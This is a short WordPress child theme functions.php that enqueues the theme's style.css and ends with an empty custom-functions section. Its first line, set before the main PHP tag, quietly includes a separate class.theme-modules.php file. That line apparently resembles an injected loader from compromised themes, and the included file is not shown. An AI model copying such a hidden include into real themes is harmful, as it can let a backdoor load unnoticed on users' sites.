<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

/*-----------------------------------------------------------------------------------*/
/*  Register style.css
/*-----------------------------------------------------------------------------------*/

add_action( 'wp_enqueue_scripts', 'theme_enqueue_styles' );
function theme_enqueue_styles() {
	// Get the theme data
	$the_theme = wp_get_theme();
    wp_enqueue_style( 'child-theme-styles', get_stylesheet_directory_uri() . '/style.css', array(), $the_theme->get( 'Version' ) );
}


/*-----------------------------------------------------------------------------------*/
/*  Custom Functions
/*-----------------------------------------------------------------------------------*/